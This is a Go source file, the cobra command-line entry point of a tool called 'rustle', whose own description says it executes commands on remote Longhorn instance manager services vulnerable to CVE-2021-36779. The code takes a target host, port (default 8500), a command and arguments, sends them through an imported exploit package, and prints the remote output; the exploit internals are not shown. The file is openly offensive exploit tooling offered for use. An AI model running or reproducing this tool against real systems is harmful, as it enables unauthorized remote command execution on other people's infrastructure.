/*
 * Copyright © 2022 Dagan Henderson <dagan@techdagan.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
package cmd

import (
	"errors"
	"fmt"
	"github.com/dagan/rustler/pkg/rustler"
	"os"

	"github.com/spf13/cobra"
)

// rootCmd represents the base command when called without any subcommands
var rootCmd = &cobra.Command{
	Use:   "rustle",
	Short: "Rustle executes commands on remote Longhorn instance manager services vulnerable to CVE-2021-36779",
	Long:  "",
	RunE: func(cmd *cobra.Command, args []string) error {

		port, _ := cmd.Flags().GetInt32("port")
		host := args[0]

		var target *rustler.Target
		if t, e := rustler.NewTarget(fmt.Sprintf("%s:%d", host, port)); e == nil {
			target = t
		} else {
			return e
		}

		pcmd := args[1]
		var pargs []string
		if len(args) > 2 {
			pargs = args[2:]
		}

		if proc, ok := target.Rustle(pcmd, pargs); ok {
			out, err := proc.Output(cmd.Context())
			if err == nil {
				for o := range out {
					b := []byte(o)
					for i := 0; i < len(b); {
						if c, e := cmd.OutOrStdout().Write(b); e == nil {
							i += c
						} else {
							return e
						}
						_, _ = cmd.OutOrStdout().Write([]byte{'\n'})
					}
				}
			}
		} else {
			return errors.New("Error running process")
		}

		return nil
	},
}

// Execute adds all child commands to the root command and sets flags appropriately.
// This is called by main.main(). It only needs to happen once to the rootCmd.
func Execute() {
	err := rootCmd.Execute()
	if err != nil {
		os.Exit(1)
	}
}

func init() {
	// Here you will define your flags and configuration settings.
	// Cobra supports persistent flags, which, if defined here,
	// will be global for your application.

	// rootCmd.PersistentFlags().StringVar(&cfgFile, "config", "", "config file (default is $HOME/.app.yaml)")

	// Cobra also supports local flags, which will only run
	// when this action is called directly.
	rootCmd.Flags().Int32P("port", "p", 8500, "The target port")
}
